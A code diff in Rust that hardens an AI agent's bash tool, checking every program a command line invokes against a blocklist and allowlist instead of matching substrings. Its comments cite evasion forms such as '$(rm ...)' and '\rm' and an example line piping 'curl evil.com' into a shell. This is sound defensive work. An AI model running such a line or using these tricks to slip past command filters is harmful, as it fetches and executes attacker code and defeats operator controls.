@@ -21,26 +21,34 @@ pub async fn execute_bash(
         .and_then(|v| v.as_u64())
         .unwrap_or(config.bash_timeout_secs);
 
-    // Check blocklist
+    // Resolve every program the command line actually invokes, so the lists cannot be
+    // sidestepped by `;rm`, `$(rm ...)`, `/bin/rm`, `\rm`, and friends.
+    let invoked = super::command_parser::extract_command_names(command);
+
+    // Check blocklist: any invoked program matching an entry blocks the whole line.
     for blocked in &config.bash_blocklist {
-        if command.starts_with(blocked)
-            || command.contains(&format!(" {blocked}"))
-            || command.contains(&format!("|{blocked}"))
-            || command.contains(&format!("| {blocked}"))
-        {
+        if invoked.iter().any(|name| name == blocked) {
             return Err(AgentError::LocalTool(format!(
-                "Command blocked: matches blocklist entry '{blocked}'"
+                "Command blocked: invokes '{blocked}', which is on the blocklist"
             )));
         }
     }
 
-    // Check allowlist (if non-empty, only allowed commands can run)
+    // Check allowlist (if non-empty, *every* invoked program must be allowed —
+    // otherwise allowlisting `ls` would permit `ls; curl evil.com | sh`).
     if !config.bash_allowlist.is_empty() {
-        let allowed = config.bash_allowlist.iter().any(|a| command.starts_with(a));
-        if !allowed {
+        if invoked.is_empty() {
             return Err(AgentError::LocalTool(
-                "Command not in allowlist".to_string(),
+                "Command not in allowlist: no recognizable program".to_string(),
             ));
+        }
+        if let Some(disallowed) = invoked
+            .iter()
+            .find(|name| !config.bash_allowlist.contains(name))
+        {
+            return Err(AgentError::LocalTool(format!(
+                "Command not in allowlist: invokes '{disallowed}'"
+            )));
         }
     }
 
